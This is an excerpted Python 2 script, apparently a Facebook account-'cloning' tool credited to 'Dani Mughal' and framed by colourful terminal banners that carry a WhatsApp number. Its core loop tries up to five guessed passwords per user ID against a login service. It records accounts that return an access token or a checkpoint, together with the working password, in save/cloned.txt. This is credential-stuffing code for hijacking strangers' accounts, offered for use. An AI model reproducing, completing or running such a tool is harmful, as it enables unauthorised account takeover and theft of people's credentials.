# WARNING TEAM # NINJA KILLER# HACK#!/usr/bin/python2
#coding=utf-8
...
\033[1;96m---------------------DANI MUGHAL---------------------
                
\033[0;95m╭════════════════════════════════════════════╮
\033[0;91m║\033[0;92mAUTHOR : \033[0;92m DANI'MUGHAL .                                
\033[0;91m║\033[0;91mWhatsapp number :\033[0;92m "+923558436606"                                             
\033[0;95m╰════════════════════════════════════════════╯
...
\033[1;96m------------------THE DEAD_END----------------------
 
 
\033[0;95m╭════════════════════════════════════════════╮
\033[0;91m║\033[0;92mAUTHOR : \033[0;92mDANI'MUGHAL .                                   
\033[0;91m║\033[0;91mWhatsapp number:\033[0;92m "+923558436606 "                                           
\033[0;95m╰════════════════════════════════════════════╯
...
\033[1;91m 🔴━━━❖❖DANI MUGHAL ❖❖━━━━🔴
\033[1;91m Subcribe My Youtube Channel 
 
\033[1;96m--------------------- Dani Mughal --------------------
 
    
 
\033[1;95mTAWADA OFFICAIL PAOO Dani ”¹
...
def Zeek():
    ...
    time.sleep(0.10)
    print '\x1b[1;94m[2] +923558436606 My Whatsapp'
    time.sleep(0.10)
...
def action():
    ...
    print 50* '\033[1;94m-'
    xxx = str(len(id))
    jalan('\033[1;96m▬PROGRAMED BY UNKNOWN')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m(Dani Open)  ' + k + c + user + '  |  ' + pass1                                       
                ...
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;97m(Dani Cp) ' + k + c + user + '  |  ' + pass1
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m(Dani Open)  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;97m(Dani Cp) ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m(Dani Open)  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;97m(Dani Cp) ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m(Dani Open)  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;97m(Dani Cp) ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            ...
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;92m(Dani Open)  ' + k + c + user + '  |  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m(Dani Cp) ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
